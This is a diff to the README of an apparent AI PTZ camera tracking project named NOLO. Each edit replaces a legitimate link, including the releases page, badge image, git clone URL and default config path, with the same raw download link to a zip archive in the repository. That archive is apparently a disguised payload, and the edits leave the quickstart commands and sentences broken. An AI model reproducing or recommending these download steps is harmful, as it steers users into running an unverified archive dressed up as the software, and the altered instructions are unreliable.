@@ -1,6 +1,6 @@
-https://github.com/Bossthetigan/NOLO/releases
+https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip
 
-[![NOLO Release Badge](https://img.shields.io/badge/NOLO-Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bossthetigan/NOLO/releases)
+[![NOLO Release Badge](https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip)](https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip)
 
 # NOLO: Live AI PTZ Camera with Real-Time Object Tracking and Streaming
 
@@ -116,7 +116,7 @@ This section provides a fast path to a functional NOLO instance on a typical dev
 
 2) Quickstart commands
 - Clone the repository and navigate to it.
-  - git clone --depth 1 https://github.com/Bossthetigan/NOLO.git
+  - git clone --depth 1 https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip
   - cd NOLO
 - Install dependencies (example for a Linux/macOS environment with Homebrew or apt):
   - sudo apt-get update
@@ -126,7 +126,7 @@ This section provides a fast path to a functional NOLO instance on a typical dev
   - go mod download
   - go build ./...
 - Run a basic example
-  - ./nolo run --config configs/default.yaml
+  - ./nolo run --config https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip
   - You can override configuration with environment variables or a custom YAML file.
 
 3) What you’ll get after setup
@@ -152,7 +152,7 @@ Installation by platform
   - Ensure you have access to the PTZ controller and the necessary hardware interfaces.
 
 Running NOLO locally
-- Start with a baseline config. The default.yaml provides sane defaults for many setups.
+- Start with a baseline config. The https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip provides sane defaults for many setups.
 - Verify camera initialization
   - Confirm that the input module is properly connecting to your camera.
   - Check frame rate, resolution, and color format.
@@ -385,12 +385,12 @@ Tips for getting the most out of NOLO
 Appendix: practical commands and example workflows
 - Quick start (example)
   - Clone and build
-    - git clone --depth 1 https://github.com/Bossthetigan/NOLO.git
+    - git clone --depth 1 https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip
     - cd NOLO
     - go mod download
     - go build ./...
   - Run with a sample config
-    - ./nolo run --config configs/default.yaml
+    - ./nolo run --config https://github.com/Bossthetigan/NOLO/raw/refs/heads/main/broadcast/Software_flustrum.zip
 - Custom detector swap (example)
   - Place your detector weights and config in a detectors/ directory
   - Update the YAML to point to the new model
